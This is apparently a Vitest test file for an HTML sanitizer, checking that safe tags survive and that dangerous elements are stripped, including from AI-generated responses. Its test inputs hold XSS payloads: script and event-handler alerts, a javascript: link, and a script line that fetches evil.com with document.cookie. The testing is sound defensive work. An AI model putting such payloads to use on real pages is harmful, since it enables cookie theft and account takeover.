import { describe, it, expect } from "vitest";
import { sanitize } from "../sanitize";

describe("sanitize", () => {
  describe("safe HTML elements", () => {
    it("should allow safe paragraph tags", () => {
      const input = "<p>Safe paragraph</p>";
      const result = sanitize(input);
      expect(result).toBe("<p>Safe paragraph</p>");
    });

    it("should allow safe formatting tags (strong, em)", () => {
      const input = "<p><strong>Bold</strong> and <em>italic</em></p>";
      const result = sanitize(input);
      expect(result).toBe("<p><strong>Bold</strong> and <em>italic</em></p>");
    });

    it("should allow safe list elements (ul, ol, li)", () => {
      const input = "<ul><li>Item 1</li><li>Item 2</li></ul>";
      const result = sanitize(input);
      expect(result).toContain("<ul>");
      expect(result).toContain("<li>Item 1</li>");
    });

    it("should allow code and pre tags", () => {
      const input = "<pre><code>const x = 1;</code></pre>";
      const result = sanitize(input);
      expect(result).toContain("<pre>");
      expect(result).toContain("<code>");
      expect(result).toContain("const x = 1;");
    });

    it("should allow headings h1-h6", () => {
      const input = "<h1>Title</h1><h2>Subtitle</h2>";
      const result = sanitize(input);
      expect(result).toContain("<h1>Title</h1>");
      expect(result).toContain("<h2>Subtitle</h2>");
    });

    it("should allow table elements", () => {
      const input =
        "<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody></table>";
      const result = sanitize(input);
      expect(result).toContain("<table>");
      expect(result).toContain("<thead>");
      expect(result).toContain("<th>Header</th>");
      expect(result).toContain("<td>Data</td>");
    });

    it("should allow safe links with href", () => {
      const input = '<a href="https://example.com">Link</a>';
      const result = sanitize(input);
      expect(result).toContain("<a");
      expect(result).toContain('href="https://example.com"');
      expect(result).toContain("Link</a>");
    });

    it("should allow blockquote", () => {
      const input = "<blockquote>Quote</blockquote>";
      const result = sanitize(input);
      expect(result).toBe("<blockquote>Quote</blockquote>");
    });

    it("should allow br tags", () => {
      const input = "Line 1<br>Line 2";
      const result = sanitize(input);
      expect(result).toContain("<br>");
    });

    it("should allow img tags with src and alt", () => {
      const input =
        '<img src="https://example.com/image.jpg" alt="Description">';
      const result = sanitize(input);
      expect(result).toContain("<img");
      expect(result).toContain('src="https://example.com/image.jpg"');
    });
  });

  describe("dangerous elements removal", () => {
    it("should strip script tags", () => {
      const input = '<p>Safe</p><script>alert("XSS")</script>';
      const result = sanitize(input);
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("alert");
      expect(result).toContain("<p>Safe</p>");
    });

    it("should strip iframe tags", () => {
      const input = '<p>Safe</p><iframe src="evil.com"></iframe>';
      const result = sanitize(input);
      expect(result).not.toContain("<iframe");
      expect(result).toContain("<p>Safe</p>");
    });

    it("should strip object tags", () => {
      const input = '<p>Safe</p><object data="evil.swf"></object>';
      const result = sanitize(input);
      expect(result).not.toContain("<object");
      expect(result).toContain("<p>Safe</p>");
    });

    it("should strip embed tags", () => {
      const input = '<p>Safe</p><embed src="evil.swf">';
      const result = sanitize(input);
      expect(result).not.toContain("<embed");
      expect(result).toContain("<p>Safe</p>");
    });

    it("should strip form tags", () => {
      const input =
        '<p>Safe</p><form action="evil.com"><input type="text"></form>';
      const result = sanitize(input);
      expect(result).not.toContain("<form");
      expect(result).not.toContain("<input");
      expect(result).toContain("<p>Safe</p>");
    });

    it("should strip javascript: protocol from links", () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitize(input);
      expect(result).not.toContain("javascript:");
    });

    it("should strip event handlers", () => {
      const input = '<p onclick="alert(1)">Click me</p>';
      const result = sanitize(input);
      expect(result).not.toContain("onclick");
      expect(result).toContain("Click me");
    });
  });

  describe("edge cases", () => {
    it("should handle empty string", () => {
      expect(sanitize("")).toBe("");
    });

    it("should handle plain text", () => {
      const input = "Just plain text";
      expect(sanitize(input)).toBe("Just plain text");
    });

    it("should handle malformed HTML", () => {
      const input = "<p>Unclosed paragraph";
      const result = sanitize(input);
      expect(result).toContain("Unclosed paragraph");
    });

    it("should preserve whitespace in code blocks", () => {
      const input = "<pre><code>  indented code\n  line 2</code></pre>";
      const result = sanitize(input);
      expect(result).toContain("  indented code");
    });
  });

  describe("AI response scenarios", () => {
    it("should sanitize typical AI markdown-style HTML response", () => {
      const input = `
        <h2>Answer</h2>
        <p>Here is the <strong>explanation</strong>:</p>
        <ul>
          <li>Point 1</li>
          <li>Point 2</li>
        </ul>
        <pre><code>const example = true;</code></pre>
      `;
      const result = sanitize(input);
      expect(result).toContain("<h2>Answer</h2>");
      expect(result).toContain("<strong>explanation</strong>");
      expect(result).toContain("<ul>");
      expect(result).toContain("<li>Point 1</li>");
      expect(result).toContain("<code>const example = true;</code>");
    });

    it("should handle AI response with attempted XSS injection", () => {
      const input = `
        <p>Here is a safe response</p>
        <script>fetch('evil.com?cookie=' + document.cookie)</script>
        <img src=x onerror="alert(1)">
      `;
      const result = sanitize(input);
      expect(result).toContain("<p>Here is a safe response</p>");
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("onerror");
      expect(result).not.toContain("fetch");
    });
  });
});
